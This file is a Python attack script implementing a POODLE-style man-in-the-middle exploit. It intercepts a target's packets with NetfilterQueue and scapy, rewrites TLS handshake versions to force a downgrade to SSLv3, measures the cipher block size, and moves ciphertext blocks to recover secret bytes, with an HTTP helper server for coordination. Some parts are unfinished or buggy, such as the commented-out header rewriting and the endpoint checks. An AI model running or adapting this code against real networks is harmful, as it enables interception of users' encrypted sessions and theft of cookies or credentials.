#!/usr/bin/env python3

from netfilterqueue import NetfilterQueue
from scapy.all import *
from scapy_http.http import *
import threading
import json
from enum import Enum
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import threading
import zlib

SSL_V3_CODE = 768

Stage = Enum('Stage', 'downgrade_dance block_length exploit')
stage = Stage.block_length

block_size = 128 # Assuming AES to start

# for block_length stage
ciphertext_length = 0

# For exploit stage
block_to_move = 1
secret = {}


load_layer('tls')

config = json.load(open('config.json'))

def get_field(layer, field_name):
	return layer.get_field(field_name).i2repr(layer, getattr(layer, field_name))

def copy_block(arr, copy_index, target_index):
	arr[target_index:(target_index+block_size)] = arr[copy_index:(copy_index+block_size)]
	return arr

def callback(packet):
	global block_size
	global block_to_move
	global ciphertext_length
	global stage

	# If packet is going to target and packet is http, change packet to inject javascript (initially only once)
	# If block length unknown and TLS data packet is going from client to server, track lengths until we get block length
	# If block length known:
		# If packet is DNS to client, and gives IP of SSL site, keep track of IP of SSL site (optional, only if using name for site)
		# If packet is from server to client, and is TLS handshake, and is TLS version > SSLv3, change to handshake fail
		# If packet is TLS data packet from client to server, copy block to end
	


	pkt = IP(packet.get_payload())

	#print(pkt.src + " -> " + pkt.dst)
	#print(pkt[0].summary())
	if pkt.haslayer(TLS) and pkt.getlayer(TLS).version > SSL_V3_CODE and stage == Stage.downgrade_dance and pkt.src != config['target']:
		print("Downgrading server packet")
		pkt.getlayer(TLS).version = SSL_V3_CODE
		packet.set_payload(bytes(pkt))
		packet.accept()
		return

	if pkt.src == config['target'] and pkt.haslayer(HTTP):
		#pkt.getlayer(HTTP).getlayer(Raw).load = bytes(str(pkt.getlayer(HTTP).getlayer(Raw).load).replace('Accept-Encoding: gzip', 'Accept-Encoding: identity').replace('Cache-Control' + str(pkt['HTTP']['HTTP Request'].fields['Cache-Control']), 'Cache-Control: no-cache'))
		pkt.getlayer(HTTP).show()

		#str_headers = str(pkt['HTTP']['HTTP Request'].fields['Headers'])
		#pkt['HTTP']['HTTP Request'].fields['Accept-Encoding'] = 'identity'
		#pkt['HTTP']['HTTP Request'].fields['Cache-Control'] = 'no-cache'
		#str_headers = str_headers.replace('Accept-Encoding: ' + str(pkt['HTTP']['HTTP Request'].fields['Accept-Encoding']), 'Accept-Encoding: identity').replace('Cache-Control' + str(pkt['HTTP']['HTTP Request'].fields['Cache-Control']), 'Cache-Control: no-cache')
		#pkt['HTTP']['HTTP Request'].fields['Headers'] = str_headers
		packet.set_payload(bytes(pkt))
		packet.accept()
		return

	if pkt.dst == config['target'] and pkt.haslayer(HTTP):
		#pkt.getlayer(HTTP).show()
		if pkt.getlayer(HTTP).haslayer(Raw):
			#print(pkt.getlayer(HTTP).getlayer(Raw).load)
			#print(zlib.decompress(pkt.getlayer(HTTP).getlayer(Raw).load))
			pass

	if pkt.src == config['target'] and pkt.haslayer(TLS):
		print("TLS Type: {}".format(get_field(pkt.getlayer(TLS), 'type')))

	if pkt.src == config['target'] and stage == Stage.exploit and pkt.haslayer(TLS) and get_field(pkt.getlayer(TLS), 'type') == "application_data":
		print("Switching block to end")
		#print(pkt.getlayer(TLS).show())
		start_index = block_size * block_to_move
		last_block_index = len(pkt) - block_size
		packet.set_payload(bytes(copy_block(list(packet.get_payload()), start_index, last_block_index)))
		packet.accept()
		return

	if pkt.src == config['target'] and stage == Stage.block_length and pkt.haslayer(TLS):
		if ciphertext_length > 0:
			if len(pkt) > ciphertext_length:
				block_size = len(pkt) - ciphertext_length
		else:
			ciphertext_length = len(pkt)
		packet.drop()
		return
		
	if (pkt.dst == '192.168.1.160'):
		pass
		#print(pkt)
		#print(pkt[0].show())

	#print(pkt[TCP].payload)
	#packet.set_payload(str(pkt))
	packet.accept()

class Handler(BaseHTTPRequestHandler):
	def do_GET(self):
		global block_size

		if self.path == 'blocksize':
			while block_size == None:
				time.sleep(0.1)	
			self.send_response(block_size)
		elif self.path == 'offset':
			for i in range(block_to_move * block_size, (block_to_move * block_size) + block_size):
				if i not in secret:
					self.send_response(i % block_size)
					return
			self.send_error(404, "Could not find offset")
		else:
			self.send_error(404, "Endpoint does not exist")

class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
	pass

web_server = ThreadingSimpleServer(('0.0.0.0', 8080), Handler)
web_server_thread = threading.Thread(target=web_server.serve_forever)

nfqueue = NetfilterQueue()
nfqueue.bind(0, callback)

try:
	web_server_thread.start()
	nfqueue.run()
except KeyboardInterrupt:
	pass

nfqueue.unbind()
web_server.shutdown()
#web_server.socket.close()
web_server_thread.join()
